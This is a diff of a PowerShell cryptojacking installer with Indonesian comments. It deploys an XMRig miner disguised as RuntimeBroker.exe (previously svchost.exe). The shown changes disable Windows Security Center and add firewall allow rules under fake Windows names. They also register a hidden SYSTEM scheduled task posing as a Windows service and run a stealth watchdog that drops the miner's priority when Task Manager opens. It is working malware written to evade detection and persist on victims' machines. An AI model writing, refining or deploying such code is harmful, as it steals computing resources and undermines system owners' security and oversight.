@@ -17,7 +17,7 @@ Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
 Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
 
 # ==========================================
-# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Kembali menggunakan svchost.exe di folder aman)
+# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Menggunakan RuntimeBroker.exe yang aman dari Critical Process Crash)
 # ==========================================
 $PossibleDirs = @(
     "C:\Users\Public\Libraries",
@@ -49,7 +49,7 @@ if ([string]::IsNullOrEmpty($Dir)) {
     }
 }
 
-$ExeName = "svchost.exe" 
+$ExeName = "RuntimeBroker.exe" 
 $ExePath = Join-Path $Dir $ExeName
 $VbsPath = Join-Path $Dir "run.vbs"
 $ZipPath = Join-Path $env:TEMP "up.zip"
@@ -60,7 +60,7 @@ $ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-h
 
 # Hentikan proses lama & task scheduler yang nyangkut
 Stop-Process -Name "RuntimeBroker", "xmrig", "svchost", "wscript", "OneDriveUpdater" -Force -ErrorAction SilentlyContinue
-Unregister-ScheduledTask -TaskName "WindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
 # ==========================================
@@ -98,19 +98,18 @@ if (Test-Path $ZipPath) {
     # ==========================================
     # 5. OTOMATIS WHITELIST FIREWALL (ALLOW INBOUND/OUTBOUND)
     # ==========================================
-    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
-    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
 
     # ==========================================
-    # 6. GENTLE STEALTH WATCHDOG (IDLE/LOW PRIORITY ON TASKMGR - NO KILL/RESTART LOOP)
+    # 6. GENTLE STEALTH WATCHDOG (IDLE PRIORITY ON TASKMGR - NO KILL/RESTART LOOP)
     # ==========================================
     $ScriptBlockCode = @"
 `$ExePath = "$ExePath"
 `$ArgsList = "$ArgsList"
 
 while (`$true) {
-    # Pastikan miner selalu berjalan di background
-    `$Running = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
+    `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue
     `$MinerProcess = `$Running | Where-Object { `$_.MainModule.FileName -eq `$ExePath } -ErrorAction SilentlyContinue
 
     if (!`$MinerProcess) {
@@ -156,12 +155,12 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
     $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 3
     
-    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
+    Register-ScheduledTask -TaskName "RuntimeBrokerService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
 
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses menggunakan svchost.exe, Idle Priority saat TaskManager dibuka (Tanpa Restart Loop), TLS Encryption, dan Firewall Whitelist!" -ForegroundColor Green
+    Write-Host "Setup sukses menggunakan RuntimeBroker.exe, Idle Priority saat TaskManager dibuka (Tanpa Crash/Restart), TLS Encryption, dan Firewall Whitelist!" -ForegroundColor Green
 } else {
     Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
